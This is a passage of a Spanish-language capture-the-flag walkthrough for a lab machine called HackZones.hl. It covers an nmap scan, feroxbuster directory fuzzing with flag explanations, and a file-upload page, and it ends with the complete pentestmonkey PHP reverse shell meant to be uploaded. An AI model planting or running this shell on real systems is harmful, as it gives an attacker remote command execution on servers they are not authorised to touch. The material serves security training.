# Enumeracion de Puertos,Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 <IP> -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 11:35 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8e:a2:56:38:e1:85:2f:21:2b:55:ec:29:5b:f8:63:d9 (ECDSA)
|_  256 0f:4b:38:fa:04:33:c7:01:5a:98:12:05:2d:42:cf:1a (ED25519)
53/tcp open  domain  ISC BIND 9.18.28-0ubuntu0.24.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.28-0ubuntu0.24.04.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: HackZones.hl - Seguridad para tu Empresa
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.84 seconds
```
Se observa que el dominio 'HackZones.hl' en el reporte que nos da 'nmap', lo podemos agregar al archivo '/etc/host' en mi caso es 
```ruby
echo '172.17.0.2 HackZones.hl' >> /etc/hosts
```
<img width="1916" height="933" alt="image" src="https://github.com/user-attachments/assets/fc93093c-63c6-4714-8b4d-4aafde8e675b" />

Este login puede ser vulnerable a intecion SQL, lo probamos y veremos que no es posible, Buscaremos otra manera realizandole Fuzzing web

# Fuzzing Web 

Usaremos esta herramienta para realizar, De tal manera que no sepan usarla os dejo el github de la herramienta -> (https://github.com/epi052/feroxbuster.git) 

```ruby
feroxbuster -u 'http://hackzones.hl/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 --random-agent --no-state -d 5
```
```bash
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://HackZones.hl/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      181l      450w     5671c http://hackzones.hl/dashboard.html
200      GET       23l      163w     1377c http://hackzones.hl/upload.php
301      GET        9l       28w      314c http://hackzones.hl/uploads => http://hackzones.hl/uploads/
200      GET       23l       62w      860c http://hackzones.hl/index.html
302      GET        0l        0w        0c http://hackzones.hl/authenticate.php => index.html?error=1
200      GET       77l      135w     1246c http://hackzones.hl/styles.css
200      GET       23l       62w      860c http://hackzones.hl/
[####>---------------] - 6m   1037419/4567992 16m     found:7       errors:1234   
[####>---------------] - 6m    544016/2283919 1479/s  http://HackZones.hl/ 
[####>---------------] - 6m    499477/2283919 1358/s  http://hackzones.hl/ 
[####################] - 5s   2283919/2283919 501409/s http://hackzones.hl/uploads/ => Directory listing (add --scan-dir-listings to scan)   
```
# (feroxbuster)
 herramienta que estamos usando para hacer un escaneo de directorios en un sitio web y encontrar archivos o rutas ocultas.

(-u 'http://<ip>/')
Esto especifica la URL de destino donde Feroxbuster hará el escaneo.

(-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt)
Este es el archivo de lista de palabras (wordlist) que contiene los posibles nombres de directorios o archivos a intentar.

/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt es un archivo incluido en SecLists, una colección de listas de palabras muy comúnmente usada en pruebas de penetración. Esta lista contiene nombres comunes de archivos y directorios que podrían estar en el servidor objetivo.

(-s 200,301,302)
Esto le dice a Feroxbuster que se concentre en buscar las respuestas HTTP con los códigos de estado 200 (OK), 301 (Redirección permanente) y 302 (Redirección temporal). Estos códigos suelen indicar que la ruta o archivo existe en el servidor.

(-x txt,php,bak,db,py,html,js,jpg,png,git)
Esta opción especifica las extensiones de archivos a buscar. Feroxbuster intentará encontrar directorios o archivos con estas extensiones:

txt, php, bak, db, py, html, js, jpg, png, git

Por ejemplo, buscará index.php, config.bak, file.js, etc.

(-t 200) 
Esta opción establece el número de hilos de concurrentes que Feroxbuster utilizará durante el escaneo. En este caso, 200 hilos, lo que significa que puede hacer hasta 200 solicitudes HTTP simultáneamente para acelerar el proceso.

(--random-agent)
Utiliza un User-Agent aleatorio para cada solicitud HTTP que envía. Esto ayuda a evitar que el escaneo sea detectado por medidas de protección como firewalls o sistemas de detección de intrusos, ya que las solicitudes parecen provenir de diferentes navegadores.

(--no-state)
Esta opción le dice a Feroxbuster que no guarde el estado de las sesiones entre ejecuciones. Esto significa que cada vez que se ejecute, el escaneo será desde cero, sin recordar directorios encontrados previamente.

(-d 5)
La opción -d establece el número máximo de intentos de directorio a realizar. En este caso, 5. Esto puede ser útil si se quiere evitar una sobrecarga del servidor durante las pruebas.

Mas ejemplos de uso de esta herramienta --> (https://epi052.github.io/feroxbuster-docs/docs/examples/)

# Continucion de maquina 

Si vamos a 'http://hackzones.hl/dashboard.html' podremos ver lo siguiente:

<img width="1917" height="929" alt="image" src="https://github.com/user-attachments/assets/34ef7b6d-0568-493f-96cc-70e1e1cce4d1" />

DAREMOS CLICK EN LA FOTO DONDE DICE ADMIN, nos aparera los siguiente:

<img width="1158" height="726" alt="image" src="https://github.com/user-attachments/assets/41fb0f22-2671-443d-afba-2a3eba41c983" />

#Subir archivo malicioso php 

Usaremos la herrmaineta (https://www.revshells.com/) es facil de usar, pero no dependan de ella, 

```ruby

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '';
$port = 0;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>                                           
```

